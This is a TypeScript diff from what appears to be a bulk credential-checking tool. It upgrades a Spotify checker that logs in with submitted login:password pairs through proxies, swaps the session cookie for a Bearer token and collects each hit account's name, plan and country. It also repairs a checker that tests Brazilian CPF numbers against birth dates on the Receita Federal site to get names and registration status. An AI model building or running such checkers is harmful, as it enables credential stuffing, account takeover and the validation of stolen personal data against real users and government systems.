@@ -2243,25 +2243,43 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
     try {
       const j = JSON.parse(body) as Record<string, unknown>;
       if (j.error === null || j.result === "ok" || j.logged_in === true) {
-        // Step 3: fetch account profile for plan + country
+        // Step 3: get Bearer token via open.spotify.com (sp_dc cookie → accessToken)
+        // api.spotify.com/v1/me only accepts Bearer tokens, not cookies from accounts.spotify.com
         const detail: string[] = [];
         try {
-          const profileRes = await runCurlWithProxyRetry(px => [
+          const tokenRes = await runCurlWithProxyRetry(px => [
             "--compressed",
             ...px,
             "-b", cookieFile,
             "-H", `User-Agent: ${DESKTOP_UA}`,
             "-H", "Accept: application/json",
-            "https://api.spotify.com/v1/me",
-          ], 12_000, 2);
-          if (profileRes.statusCode === 200) {
-            const p = JSON.parse(profileRes.body) as Record<string, unknown>;
-            const name    = (p.display_name ?? p.id ?? "") as string;
-            const country = (p.country ?? "") as string;
-            const product = (p.product ?? "") as string; // "premium" | "free" | "open"
-            if (name)    detail.push(`nome:${name.slice(0, 40)}`);
-            if (product) detail.push(`plano:${product}`);
-            if (country) detail.push(`país:${country}`);
+            "-H", "Origin: https://open.spotify.com",
+            "-H", "Referer: https://open.spotify.com/",
+            "https://open.spotify.com/get_access_token?reason=transport&productType=web_player",
+          ], 10_000, 2);
+          if (tokenRes.statusCode === 200) {
+            const tokenJ = JSON.parse(tokenRes.body) as Record<string, unknown>;
+            const accessToken = tokenJ.accessToken as string | undefined;
+            if (accessToken) {
+              // Step 4: fetch profile with Bearer token
+              const profileRes = await runCurlWithProxyRetry(px => [
+                "--compressed",
+                ...px,
+                "-H", `Authorization: Bearer ${accessToken}`,
+                "-H", `User-Agent: ${DESKTOP_UA}`,
+                "-H", "Accept: application/json",
+                "https://api.spotify.com/v1/me",
+              ], 10_000, 2);
+              if (profileRes.statusCode === 200) {
+                const p = JSON.parse(profileRes.body) as Record<string, unknown>;
+                const name    = (p.display_name ?? p.id ?? "") as string;
+                const country = (p.country ?? "") as string;
+                const product = (p.product ?? "") as string; // "premium" | "free" | "open"
+                if (name)    detail.push(`nome:${name.slice(0, 40)}`);
+                if (product) detail.push(`plano:${product}`);
+                if (country) detail.push(`país:${country}`);
+              }
+            }
           }
         } catch { /**/ }
         return { credential, login, status: "HIT", detail: detail.length ? detail.join(" | ") : "spotify_ok" };
@@ -2301,8 +2319,9 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
 //  Format: login = CPF (11 dígitos), password = data de nascimento (DD/MM/YYYY)
 //  Returns: nome, situação cadastral (Regular/Suspensa/Cancelada/Pendente)
 // ═══════════════════════════════════════════════════════════════════════════════
-const RECEITA_TIMEOUT = 20_000;
-const RECEITA_URL = "https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb/consultarSituacao/ConsultarPublico.asp";
+const RECEITA_TIMEOUT = 25_000;
+const RECEITA_BASE = "https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb";
+const RECEITA_URL = `${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`;
 
 function formatCPF(cpf: string): string {
   const digits = cpf.replace(/\D/g, "");
@@ -2331,7 +2350,20 @@ async function checkReceita(login: string, password: string): Promise<CheckResul
     return { credential, login, status: "FAIL", detail: "DATA_INVALIDA:use_DDMMYYYY" };
   }
 
+  const receitaCookieFile = `/tmp/rf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
+    // Step 1: GET the form page to obtain ASPSESSIONID cookie (required by the ASP.NET server)
+    try {
+      await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        "-c", receitaCookieFile, "-b", receitaCookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        `${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`,
+      ], 12_000);
+    } catch { /* ignore — POST might still work */ }
+
     const postBody = [
       `txtCPF=${encodeURIComponent(formatCPF(cpf))}`,
       `txtDataNascimento=${encodeURIComponent(dataNascimento)}`,
@@ -2340,11 +2372,12 @@ async function checkReceita(login: string, password: string): Promise<CheckResul
 
     const result = await runCurl([
       "--compressed", "-X", "POST",
+      "-c", receitaCookieFile, "-b", receitaCookieFile,
       "-H", `User-Agent: ${DESKTOP_UA}`,
       "-H", "Content-Type: application/x-www-form-urlencoded",
       "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
       "-H", "Accept-Language: pt-BR,pt;q=0.9",
-      "-H", "Referer: https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb/default.asp",
+      "-H", `Referer: ${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`,
       "-H", "Origin: https://solucoes.receita.fazenda.gov.br",
       "-L", "--max-redirs", "3",
       "--data-raw", postBody,
@@ -2403,6 +2436,8 @@ async function checkReceita(login: string, password: string): Promise<CheckResul
     return { credential, login, status: "FAIL", detail: "cpf_ou_data_incorretos" };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(receitaCookieFile); } catch { /**/ }
   }
 }
 
@@ -2680,6 +2715,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     const checker     = resolveChecker(target);
     const concurrency = CONCURRENCY[target];
     const localMapper = async ({ login, password }: { login: string; password: string }) => {
+      if (clientGone) return { credential: `${login}:?`, login, status: "ERROR" as const, detail: "aborted", wasRetried: false };
       const r = await checker(login, password);
       return { ...r, wasRetried: false };
     };
